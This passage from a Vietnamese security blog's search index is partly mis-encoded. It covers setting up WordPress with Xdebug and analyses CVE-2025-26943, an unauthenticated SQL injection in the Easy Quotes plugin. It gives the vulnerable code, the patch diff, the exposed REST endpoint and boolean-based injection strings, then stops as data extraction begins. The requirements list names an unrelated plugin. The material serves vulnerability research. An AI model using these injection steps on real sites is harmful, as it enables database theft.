id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  